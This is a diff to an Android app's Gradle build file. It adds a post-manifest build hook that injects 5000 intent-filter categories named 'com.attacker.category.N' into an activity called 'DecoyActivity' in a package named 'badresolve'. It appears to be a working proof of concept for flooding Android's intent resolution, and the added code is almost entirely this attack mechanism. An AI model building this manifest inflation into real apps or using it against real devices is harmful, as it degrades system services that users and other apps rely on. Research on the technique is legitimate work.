@@ -1,6 +1,11 @@
 import com.android.build.gradle.internal.tasks.CompileArtProfileTask
 import java.nio.file.Paths
 
+import groovy.util.XmlParser
+import groovy.util.XmlNodePrinter
+import groovy.util.Node
+import java.io.PrintWriter
+
 plugins {
     id('com.android.application')
     id('org.jetbrains.kotlin.android')
@@ -94,6 +99,46 @@ android {
     kotlin {
         jvmToolchain(21)
     }
+    
+    applicationVariants.all { variant ->
+        variant.outputs.each { output ->
+            output.processManifestProvider.configure {
+                doLast {
+                    def manifestFile = output.manifestOutputDirectory.get().asFile
+                    def manifest = manifestFile.listFiles()[0]
+                    
+                    // 读取 manifest
+                    def xml = new XmlParser(false, false, true).parse(manifest)
+                    
+                    // 找到 DecoyActivity
+                    def decoyActivity = xml.application.'activity'.find { 
+                        it.'@android:name' == 'com.cfks.badresolve.DecoyActivity' 
+                    }
+                    
+                    if (decoyActivity != null) {
+                        def intentFilter = decoyActivity.'intent-filter'[0]
+                        
+                        // 生成 5000 个 categories
+                        int categoryCount = 5000
+                        for (int i = 0; i < categoryCount; i++) {
+                            def category = new Node(null, "category")
+                            category.attributes().put("android:name", 
+                                "com.attacker.category.${i}")
+                            intentFilter.append(category)
+                        }
+                        
+                        // 写回 manifest
+                        def printer = new XmlNodePrinter(new PrintWriter(manifest))
+                        printer.preserveWhitespace = true
+                        printer.print(xml)
+                        
+                        println "Added ${categoryCount} categories to DecoyActivity"
+                    }
+                }
+            }
+        }
+    }
+    
 }
 
 autoResConfig {
